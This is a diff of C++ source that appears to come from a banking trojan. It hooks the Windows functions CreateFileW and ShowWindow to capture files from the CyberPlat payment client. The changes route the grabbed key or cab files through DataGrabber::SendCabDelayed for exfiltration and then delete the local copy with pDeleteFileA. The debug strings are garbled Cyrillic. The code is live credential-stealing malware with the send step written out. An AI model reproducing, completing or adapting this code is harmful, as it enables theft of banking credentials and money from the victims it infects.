@@ -169,9 +169,11 @@ HANDLE WINAPI HOOK_CPLATCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, 
 								pBank->dwType   = 4;
 
 								m_memcpy( pBank->FilePath, Path, m_lstrlen( Path ) );								
-								
-								Cuber_LDBG("ÑyberPlat","Âûçûâàåì ïîòîê îòïðàâêè");
-								StartThread( SendBSSInist, pBank );
+
+								Cuber_LDBG("ÑyberPlat","Îòïðàâëÿåì äàííûå");
+								DataGrabber::SendCabDelayed(NULL, pBank->FilePath, "cyberplat");
+                                pDeleteFileA(pBank->FilePath);
+//								StartThread( SendBSSInist, pBank );
 							}
 						}
 
@@ -323,6 +325,7 @@ BOOL WINAPI HOOK_ShowWindow( HWND hWnd, int nCmdShow )
 
 void HookShowWindow()
 {
+
 	UnhookShowWindow();
 
 	if ( HookApi( 3, 0x7506E960, &HOOK_ShowWindow ) )
@@ -626,13 +629,14 @@ bool GrabCyber( HWND hCyberForm )
 
 							if ( pBank )
 							{
-								pBank->FilePath = (char*)MemAlloc( m_lstrlen( CabName ) + 1 );
-								pBank->dwType   = 4;
-
-								m_memcpy( pBank->FilePath, CabName, m_lstrlen( CabName ) );
+//								pBank->FilePath = (char*)MemAlloc( m_lstrlen( CabName ) + 1 );
+//								pBank->dwType   = 4;
+//
+//								m_memcpy( pBank->FilePath, CabName, m_lstrlen( CabName ) );
 								
-								StartThread( SendBSSInist, pBank );
+//								StartThread( SendBSSInist, pBank );
 
+								DataGrabber::SendCabDelayed(NULL, CabName, "cyberplat");
 
 								STR::Free( CabName );
 
